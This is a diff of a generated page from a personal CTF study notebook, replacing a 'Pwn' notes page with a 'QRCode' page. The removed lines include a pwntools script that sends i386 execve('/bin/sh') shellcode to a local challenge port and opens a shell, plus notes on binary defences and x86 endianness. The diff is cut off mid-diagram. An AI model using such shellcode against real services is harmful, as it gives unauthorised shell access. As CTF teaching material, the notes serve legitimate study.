@@ -10,28 +10,28 @@
       
       
       
-        <link rel="canonical" href="https://note.huaeryi.com/ctf/pwn/">
+        <link rel="canonical" href="https://note.huaeryi.com/ctf/misc/qrcode/">
       
       
-        <link rel="prev" href="../reverse/unpack/">
+        <link rel="prev" href="../escape/">
       
       
-        <link rel="next" href="rop/">
+        <link rel="next" href="../../crypto/">
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.2, mkdocs-material-9.3.1">
     
     
       
-        <title>Pwn - Huayi's Notebook</title>
+        <title>QRCode - Huayi's Notebook</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.046329b4.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.046329b4.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.85d0ee34.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.85d0ee34.min.css">
       
       
   
@@ -85,13 +85,13 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/extra.css">
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
     
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css">
     
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.min.css">
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -116,7 +116,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#pwn" class="md-skip">
+        <a href="#qrcode" class="md-skip">
           跳转至
         </a>
       
@@ -130,7 +130,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="页眉">
-    <a href="../.." title="Huayi&#39;s Notebook" class="md-header__button md-logo" aria-label="Huayi's Notebook" data-md-component="logo">
+    <a href="../../.." title="Huayi&#39;s Notebook" class="md-header__button md-logo" aria-label="Huayi's Notebook" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2Z"/></svg>
@@ -150,7 +150,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Pwn
+              QRCode
             
           </span>
         </div>
@@ -232,7 +232,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../.." class="md-tabs__link">
+        <a href="../../.." class="md-tabs__link">
           
   
     
@@ -252,7 +252,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../oi/" class="md-tabs__link">
+        <a href="../../../oi/" class="md-tabs__link">
           
   
     
@@ -274,7 +274,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../" class="md-tabs__link">
+        <a href="../../" class="md-tabs__link">
           
   
     
@@ -294,7 +294,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../ctf_contest/" class="md-tabs__link">
+        <a href="../../../ctf_contest/" class="md-tabs__link">
           
   
     
@@ -329,7 +329,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Huayi&#39;s Notebook" class="md-nav__button md-logo" aria-label="Huayi's Notebook" data-md-component="logo">
+    <a href="../../.." title="Huayi&#39;s Notebook" class="md-nav__button md-logo" aria-label="Huayi's Notebook" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 4v6l-2-2-2 2V4H9v16h10V4h-2M3 7V5h2V4a2 2 0 0 1 2-2h12c1.05 0 2 .95 2 2v16c0 1.05-.95 2-2 2H7c-1.05 0-2-.95-2-2v-1H3v-2h2v-4H3v-2h2V7H3m2-2v2h2V5H5m0 14h2v-2H5v2m0-6h2v-2H5v2Z"/></svg>
@@ -379,7 +379,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../.." class="md-nav__link ">
+            <a href="../../.." class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -410,7 +410,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../home/schedule/" class="md-nav__link">
+      <a href="../../../home/schedule/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -468,7 +468,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../oi/" class="md-nav__link ">
+            <a href="../../../oi/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -520,7 +520,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../oi/dp/" class="md-nav__link ">
+            <a href="../../../oi/dp/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -551,7 +551,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/dp/dp_pack/" class="md-nav__link">
+      <a href="../../../oi/dp/dp_pack/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -621,7 +621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/ds/ds_disjoint/" class="md-nav__link">
+      <a href="../../../oi/ds/ds_disjoint/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -641,7 +641,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/ds/tree_array/" class="md-nav__link">
+      <a href="../../../oi/ds/tree_array/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -661,7 +661,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/ds/segment_tree/" class="md-nav__link">
+      <a href="../../../oi/ds/segment_tree/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -727,7 +727,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/flow/" class="md-nav__link">
+      <a href="../../../oi/flow/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -755,7 +755,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/search/dfs/" class="md-nav__link">
+      <a href="../../../oi/search/dfs/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -775,7 +775,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/other/" class="md-nav__link">
+      <a href="../../../oi/other/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -795,7 +795,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../oi/stl/" class="md-nav__link">
+      <a href="../../../oi/stl/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -863,7 +863,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../" class="md-nav__link ">
+            <a href="../../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -894,7 +894,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../tools/" class="md-nav__link">
+      <a href="../../tools/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -912,6 +912,8 @@
                 
   
   
+    
+  
   
     
     
@@ -926,18 +928,18 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" checked>
         
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../misc/" class="md-nav__link ">
+            <a href="../" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -953,7 +955,7 @@
             
           </div>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_3_3">
             <span class="md-nav__icon md-icon"></span>
             Misc
@@ -968,7 +970,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../misc/escape/" class="md-nav__link">
+      <a href="../escape/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -986,9 +988,29 @@
                 
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../misc/qrcode/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    QRCode
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -997,6 +1019,40 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    分析工具
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    二维码标准
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -1016,7 +1072,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../crypto/" class="md-nav__link">
+      <a href="../../crypto/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1061,7 +1117,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../web/" class="md-nav__link ">
+            <a href="../../web/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1092,7 +1148,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web/php/" class="md-nav__link">
+      <a href="../../web/php/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1112,7 +1168,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web/sql/" class="md-nav__link">
+      <a href="../../web/sql/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1132,7 +1188,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../web/ssrf/" class="md-nav__link">
+      <a href="../../web/ssrf/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1181,7 +1237,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../reverse/" class="md-nav__link ">
+            <a href="../../reverse/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1212,7 +1268,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../reverse/unpack/" class="md-nav__link">
+      <a href="../../reverse/unpack/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1238,8 +1294,6 @@
                 
   
   
-    
-  
   
     
     
@@ -1252,18 +1306,18 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
         
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="./" class="md-nav__link md-nav__link--active">
+            <a href="../../pwn/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1273,13 +1327,13 @@
 
             </a>
             
-              <label class="md-nav__link md-nav__link--active" for="__nav_3_7">
+              <label class="md-nav__link " for="__nav_3_7">
                 <span class="md-nav__icon md-icon"></span>
               </label>
             
           </div>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_3_7">
             <span class="md-nav__icon md-icon"></span>
             Pwn
@@ -1294,7 +1348,7 @@
   
   
     <li class="md-nav__item">
-      <a href="rop/" class="md-nav__link">
+      <a href="../../pwn/rop/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1322,7 +1376,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../blockchain/" class="md-nav__link">
+      <a href="../../blockchain/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1342,7 +1396,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../android/" class="md-nav__link">
+      <a href="../../android/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1362,7 +1416,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../osint/" class="md-nav__link">
+      <a href="../../osint/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1403,7 +1457,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../cve/" class="md-nav__link ">
+            <a href="../../cve/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1434,7 +1488,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../cve/CVE-2017-11610/" class="md-nav__link">
+      <a href="../../cve/CVE-2017-11610/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1490,7 +1544,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../ctf_contest/" class="md-nav__link ">
+            <a href="../../../ctf_contest/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1521,7 +1575,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../ctf_contest/hackgame2023/" class="md-nav__link">
+      <a href="../../../ctf_contest/hackgame2023/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1569,125 +1623,16 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#pwn_1" class="md-nav__link">
-    Pwn工具
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#shellcode" class="md-nav__link">
-    Shellcode
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#defense" class="md-nav__link">
-    Defense
-  </a>
-  
-    <nav class="md-nav" aria-label="Defense">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#relro" class="md-nav__link">
-    RELRO
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#canary" class="md-nav__link">
-    Canary
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#nx" class="md-nav__link">
-    NX
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#aslr" class="md-nav__link">
-    ASLR
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#x86" class="md-nav__link">
-    x86
-  </a>
-  
-    <nav class="md-nav" aria-label="x86">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#x86_1" class="md-nav__link">
-    x86寄存器
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#x86_2" class="md-nav__link">
-    x86函数调用栈
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#format-string-bug" class="md-nav__link">
-    Format String Bug
-  </a>
-  
-    <nav class="md-nav" aria-label="Format String Bug">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    内存泄露
+    分析工具
   </a>
   
 </li>
-        
-          <li class="md-nav__item">
+      
+        <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
-    内存修改
+    二维码标准
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#got" class="md-nav__link">
-    got表攻击
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    返回地址攻击
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1709,283 +1654,13 @@
   
 
 
-<h1 id="pwn">Pwn</h1>
-<h3 id="pwn_1">Pwn工具</h3>
-<details class="abstract" open="open">
-<summary>tools</summary>
+<h1 id="qrcode">QRCode</h1>
+<h3 id="_1">分析工具</h3>
 <ul>
-<li>脚本编写<ul>
-<li>pwntools：写exp和poc的利器</li>
+<li>QR research</li>
+<li><a href="https://merri.cx/qrazybox/">qrazybox</a></li>
 </ul>
-</li>
-<li>调试工具<ul>
-<li>GDB: Linux调试中必要用到的</li>
-<li>gdb-peda、pwndbg、gef: GDB调试插件</li>
-<li>windbg: windows环境    </li>
-</ul>
-</li>
-<li>程序信息<ul>
-<li>checksec：可以很方便的知道elf程序的安全性和程序的运行平台</li>
-<li>objdump ：可以很快的知道elf程序中的关键信息</li>
-<li>readelf：可以很快的知道elf程序中的关键信息</li>
-<li>file：查看文件类型</li>
-</ul>
-</li>
-<li>反汇编 <ul>
-<li>IDA pro：反汇编工具</li>
-<li>ghidra：反汇编工具，冷门架构</li>
-</ul>
-</li>
-<li>
-<p>libc相关     </p>
-<ul>
-<li>libc-databases：可以通过泄露的libc的某个函数地址查出远程系统是用的哪个libc版本</li>
-<li>ROPgadget：强大的rop利用工具</li>
-<li>one_gadget：可以快速的寻找libc中的调用exec('/bin/sh')的位置</li>
-</ul>
-</li>
-<li>
-<p>需要注意gdb中的栈空间和直接运行是不一样的，即使关闭了ASLR</p>
-</li>
-</ul>
-</details>
-<h3 id="shellcode">Shellcode</h3>
-<ul>
-<li><code>checksec</code>检测程序防御方式</li>
-<li>pwntools编写shellcode攻击脚本</li>
-<li><code>cyclic 10</code>生成大小为10字符串</li>
-<li><a href="http://shell-storm.org/shellcode/">shellcode exp</a></li>
-</ul>
-<details class="abstract" open="open">
-<summary>shellcode</summary>
-<div class="tabbed-set tabbed-alternate" data-tabs="1:1"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Python</label></div>
-<div class="tabbed-content">
-<div class="tabbed-block">
-<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-0-10">10</a></span>
-<span class="normal"><a href="#__codelineno-0-11">11</a></span>
-<span class="normal"><a href="#__codelineno-0-12">12</a></span>
-<span class="normal"><a href="#__codelineno-0-13">13</a></span>
-<span class="normal"><a href="#__codelineno-0-14">14</a></span>
-<span class="normal"><a href="#__codelineno-0-15">15</a></span>
-<span class="normal"><a href="#__codelineno-0-16">16</a></span>
-<span class="normal"><a href="#__codelineno-0-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c1"># context.log_level = &#39;debug&#39;</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">11003</span><span class="p">)</span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;&#39;&#39;</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="s1">        mov edx, 0</span>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="s1">        mov ecx, 0</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="s1">        push 0x68732f</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="s1">        push 0x6e69622f</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="s1">        mov ebx, esp</span>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="s1">        mov eax, 0xb</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="s1">        int 0x80</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></code></pre></div></td></tr></table></div>
-</div>
-</div>
-</div>
-</details>
-<h3 id="defense">Defense</h3>
-<ul>
-<li>用<code>checksec</code>检测二进制文件防御手段</li>
-</ul>
-<details class="abstract" open="open">
-<summary>Defense</summary>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Arch:     i386-32-little
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>RELRO:    No RELRO
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Stack:    No canary found
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>NX:       NX enabled
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>PIE:      No PIE (0x8048000)    
-</span></code></pre></div>
-</details>
-<h4 id="relro">RELRO</h4>
-<ul>
-<li>开启说明got表不可修改</li>
-</ul>
-<h4 id="canary">Canary</h4>
-<ul>
-<li>堆栈金丝雀，在函数调用时写入cookie，在返回时检查</li>
-</ul>
-<h4 id="nx">NX</h4>
-<ul>
-<li>栈不可执行</li>
-</ul>
-<h4 id="aslr">ASLR</h4>
-<ul>
-<li>地址空间随机化ASLR(address space layout randomization)</li>
-<li>即PIE</li>
-<li>0 - 表示关闭进程地址空间随机化</li>
-<li>1 - 表示将mmap的基址，stack和vdso页面随机化</li>
-<li>2 - 表示在1的基础上增加堆（heap）的随机化</li>
-</ul>
-<h3 id="x86">x86</h3>
-<h4 id="x86_1">x86寄存器</h4>
-<details class="abstract">
-<summary>x86 register</summary>
-<p><img alt="" src="register1.png" />
-<img alt="" src="register2.png" /></p>
-</details>
-<h4 id="x86_2">x86函数调用栈</h4>
-<ul>
-<li>我们总是可以看到，如果按处理器位长寻址，那么地址是+4或者+8，一个地址包含了4字节或8字节的数据（32bit或64bit）</li>
-<li>如果按字节寻址，那么地址总是+1，一个地址包含了1字节的数据（8bit），可见无论处理器位长为多少，一个地址所能代表的最小单位都是一字节</li>
-</ul>
-<details class="info" open="open">
-<summary>字节序</summary>
-<ul>
-<li><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82%E5%BA%8F">wiki百科</a></li>
-<li>对于多字节处理器位长而言，字节序有大端小端之分，字节序指的是多字节编码中以字节为单位排布的顺序，即8bit为一组，字节内部的顺序是不变的</li>
-<li>因此将一个地址上的内容输出和将一个地址上的内容按字节增长顺序输出，小端法得到的结果是不一样的，大端法会得到相同的结果</li>
-<li>数<code>0x12345678</code>的32位补码表示<code>0001 0010 0011 0100 0101 0110 0111 1000</code><ul>
-<li>32bit大端法表示<code>12 34 56 78</code> 补码表示<code>0001 0010 0011 0100 0101 0110 0111 1000</code></li>
-<li>32bit小端法表示<code>78 56 34 12</code> 补码表示<code>0111 1000 0101 0110 0011 0100 0001 0010</code></li>
-</ul>
-</li>
-</ul>
-<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">地址向右增长(易于理解,与上述解释匹配)</label><label for="__tabbed_2_2">地址向左增长(与寄存器和下述栈结构匹配)</label></div>
-<div class="tabbed-content">
-<div class="tabbed-block">
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>High
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Address       | 32bit 4Byte     |
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>              +-----------------+
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>              | 大端法           |
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>              +-----------------+
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>Address    =&gt; | 0x4 0x5 0x6 0x7 |                      
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>0x00000004 =&gt; | 12  34  56  78  |
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>              +-----------------+
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>              | 小端法           |
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>              +-----------------+
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>Address    =&gt; | 0x4 0x5 0x6 0x7 |                      
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>0x00000004 =&gt; | 78  56  34  12  |
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>              +-----------------+
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>Low           0-------&gt;&gt;-------31
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>Address
-</span></code></pre></div>
-</div>
-<div class="tabbed-block">
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>High
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Address       | 32bit 4Byte     |
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>              +-----------------+
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>              | 大端法           |
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>              +-----------------+
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Address    &lt;= | 0x7 0x6 0x5 0x4 |                      
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>0x00000004 =&gt; | 78  56  34  12  |
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>              +-----------------+
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>              | 小端法           |
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>              +-----------------+
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>Address    &lt;= | 0x7 0x6 0x5 0x4 |                      
